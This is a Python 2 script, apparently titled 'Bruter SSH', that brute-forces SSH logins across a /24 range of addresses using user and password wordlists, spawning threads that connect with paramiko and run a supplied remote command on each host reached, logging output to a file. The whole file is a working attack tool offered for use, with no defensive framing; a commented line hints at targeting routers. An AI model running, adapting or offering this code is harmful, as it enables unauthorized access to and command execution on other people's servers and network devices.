import sys, os, string, threading
import paramiko
import time
import os






if(len(sys.argv) < 5):
    os.system("clear")
    print """
                         


______            _              _____ _____ _   _ 
| ___ \          | |            /  ___/  ___| | | |
| |_/ /_ __ _   _| |_ ___ _ __  \ `--.\ `--.| |_| |
| ___ \ '__| | | | __/ _ \ '__|  `--. \`--. \  _  |
| |_/ / |  | |_| | ||  __/ |    /\__/ /\__/ / | | |
\____/|_|   \__,_|\__\___|_|    \____/\____/\_| |_/
                                                   
                                                   


                                      
                                                          
     
    Bomber Threads for nuts!

    by Ak1t4 [adeveloper870@gmail.com] - 2015 


    Usage: ./bruter.py user-dic.txt password-dic.txt 127.0.0.0 remote-command

    """
    sys.exit(1)

else:


    user = open(sys.argv[1],'rU').read().split('\n')

    password = open(sys.argv[2],'rU').read().split('\n')

    address = sys.argv[3]

    command = sys.argv[4]

    cmd = command
    #cmd = "/system routerboard print"


'''
print password
print user




time.sleep(5)

'''

outlock = threading.Lock()

def workon(host):

    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, username=user1, password=password1,timeout=8,allow_agent=False)
    stdin, stdout, stderr = ssh.exec_command(cmd)



    #escribe salida
    salida = stdout.read()
    f = open("salida.txt","a")
    f.write(salida)
    f.close()
      
   # stdin.write('admin\n')
   # stdin.flush()

    with outlock:
        print stdout.readlines()


def incrementAddress(address, to = 249, by = 1):
    position = address.rindex('.') + 1
    for each in xrange(1, to + 1, by):
        yield address[:position] + str(each)



def main():

    os.system("clear")

    print """




______            _              _____ _____ _   _ 
| ___ \          | |            /  ___/  ___| | | |
| |_/ /_ __ _   _| |_ ___ _ __  \ `--.\ `--.| |_| |
| ___ \ '__| | | | __/ _ \ '__|  `--. \`--. \  _  |
| |_/ / |  | |_| | ||  __/ |    /\__/ /\__/ / | | |
\____/|_|   \__,_|\__\___|_|    \____/\____/\_| |_/
                                                   
                                                   


                                                                                                                                        
Bomber Threads for nuts!

by Ak1t4  [adeveloper870@gmail.com] - 2015 


Usage: ./bruter.py user-dic.txt password-dic.txt 127.0.0.0 remote-command



"""

    print("\n")

    print "Launching Bomber Threads..."
    print("\n")

    time.sleep(5)


    hosts = open("ips.txt","rU")
    

    #hosts = ['127.0.0.1', '192.168.111.254', '19.1.1.2', '1.1.1.1','2.2.2.2','3.3.3.3','4.4.4.4','5.5.5.5','6.6.6.6'] # etc
    threads = []



   
    for h in hosts:

        t = threading.Thread(target=workon, args=(h,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()




archivo = open("ips.txt","w")

if __name__ == '__main__':
    for IP in incrementAddress(address, 253):
        
        archivo.write(IP+"\n")


archivo.close()


for user1 in user:

    for password1 in password:


        main()


#os.system("rm -rf salida.txt")

